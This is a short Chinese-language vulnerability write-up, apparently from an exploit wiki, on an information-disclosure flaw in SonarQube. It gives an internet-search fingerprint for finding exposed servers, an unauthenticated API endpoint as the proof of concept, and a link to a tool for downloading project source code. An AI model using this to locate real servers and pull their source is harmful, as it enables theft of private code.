# SonarQube search_projects 项目信息泄露漏洞

## 漏洞描述

SonarQube 某接口存在信息泄露漏洞，可以通过工具下载源码

## 漏洞影响

<a-checkbox checked>SonarQube</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="sonarQube-代码管理"</a-checkbox></br>

## 漏洞复现

主页如下

![img](../../../.vuepress/public/img/1628578104263-4058ad67-3556-4948-bb84-80b780f6a808.png)



漏洞POC

```plain
http://xxx.xxx.xxx.xxx/api/components/search_projects
```

![img](../../../.vuepress/public/img/1628578139002-6ae5f685-2e56-488e-9bd8-ca7c17d40416.png)

可通过工具下载项目中的源代码 



https://github.com/deletescape/sloot

![img](../../../.vuepress/public/img/1628578178570-b0b44348-d38e-4988-975a-f7540c3871c1.png)